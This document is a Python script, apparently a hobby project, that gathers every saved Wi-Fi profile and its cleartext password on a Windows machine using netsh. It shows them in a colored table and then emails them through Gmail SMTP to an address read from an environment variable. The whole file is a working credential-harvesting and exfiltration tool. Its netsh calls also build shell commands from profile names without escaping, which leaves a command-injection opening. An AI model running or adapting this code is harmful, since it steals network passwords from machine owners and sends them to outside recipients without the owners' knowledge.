# 📶 Wi-Fi Profile Extractor with Pretty Output
# --------------------------------------------
# ✅ Lists saved Wi-Fi profiles
# ✅ Extracts passwords
# ✅ Displays in a colorful table
# ✅ Sends results in a styled HTML email

import subprocess, re, smtplib, os
from prettytable import PrettyTable
from colorama import Fore, Style, init
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from dotenv import load_dotenv

# Initialize colorama (for Windows terminal color support)
init(autoreset=True)


def configure():
    """Loads environment variables from a .env file."""
    load_dotenv()


def fetch_credentials():
    """
    Scans the system for saved Wi-Fi profiles and extracts passwords.
    Returns:
        str: PrettyTable output as a string.
    """
    configure()
    print("🔍 Scanning for saved Wi-Fi profiles...\n")

    try:
        profiles = subprocess.check_output("netsh wlan show profile", text=True, shell=True)
    except subprocess.CalledProcessError:
        print("❌ Error: Could not fetch Wi-Fi profiles.")
        return ""

    # Extract profile names using regex
    profile_list = re.findall(r"All User Profile\s*:\s*(.+)", profiles)

    # Setup pretty table
    table = PrettyTable()
    table.field_names = [f"{Fore.CYAN}📡 Net-Name{Style.RESET_ALL}", f"{Fore.YELLOW}🔑 Password{Style.RESET_ALL}"]
    table.align = "l"
    table.hrules = 1

    # Loop through each profile to get passwords
    for net_nm in profile_list:
        try:
            key_details = subprocess.check_output(
                f'netsh wlan show profile "{net_nm}" key=clear',
                shell=True, text=True
            )
            key_list = re.findall(r"Key Content\s*:\s*(.+)", key_details)
            password = key_list[0] if key_list else "N/A"
            table.add_row([f"{Fore.CYAN}{net_nm}", f"{Fore.YELLOW}{password}"])
        except subprocess.CalledProcessError:
            table.add_row([f"{Fore.CYAN}{net_nm}", f"{Fore.RED}ERROR"])

    print("\n📋 Extracted Wi-Fi Credentials:\n")
    print(table)
    return table.get_string()


def remove_ansi(text):
    """
    Removes ANSI color codes from a string.
    Args:
        text (str): Colored terminal text.
    Returns:
        str: Cleaned plain text.
    """
    return re.sub(r'\x1b\[[0-9;]*m', '', text)


def load_html_template(rows_html):
    """
    Loads the HTML email template and injects table rows.
    Args:
        rows_html (str): HTML table rows.
    Returns:
        str: Complete HTML email body.
    """
    with open("wifi-extractor\\email_template.html", "r", encoding="utf-8") as f:
        return f.read().replace("{{table_rows}}", rows_html)


def send_mail(email, password, table_plain):
    """
    Sends an email with both plain text and HTML versions of the Wi-Fi credentials.
    Args:
        email (str): Sender email address.
        password (str): App-specific password for sender email.
        table_plain (str): Wi-Fi data in plain text format.
    """
    print("\n📤 Sending HTML email...")

    try:
        # Email structure
        msg = MIMEMultipart("alternative")
        msg["From"] = email
        msg["To"] = os.getenv("TO_EMAIL")
        msg["Subject"] = "📡 Extracted Wi-Fi Credentials"

        # Clean terminal formatting
        clean_plain = remove_ansi(table_plain)

        # Convert text table into HTML <tr> rows
        html_table_rows = ""
        for line in clean_plain.splitlines():
            if "|" in line and not line.startswith("+") and "Net-Name" not in line:
                parts = [x.strip() for x in line.split("|")[1:-1]]
                if len(parts) == 2:
                    html_table_rows += f"<tr><td>{parts[0]}</td><td>{parts[1]}</td></tr>"

        # Load final HTML
        html_body = load_html_template(html_table_rows)

        # Plain text fallback version
        text_version = f"""
Hello 👋,

Here are the extracted Wi-Fi profiles and passwords:

{clean_plain}

🔐 Stay secure!

- WiFi Extractor Bot 🤖
"""

        # Attach both formats
        msg.attach(MIMEText(text_version, "plain", "utf-8"))
        msg.attach(MIMEText(html_body, "html", "utf-8"))

        # Send via SMTP
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, msg["To"], msg.as_string())
        server.quit()

        print("✅ Email sent with HTML formatting!")

    except Exception as e:
        print(f"❌ Email failed: {e}")


# 🧪 Entry point
if __name__ == "__main__":
    wifi_info = fetch_credentials()
    send_mail(os.getenv('FROM_EMAIL'), os.getenv("APP_PASS"), wifi_info)
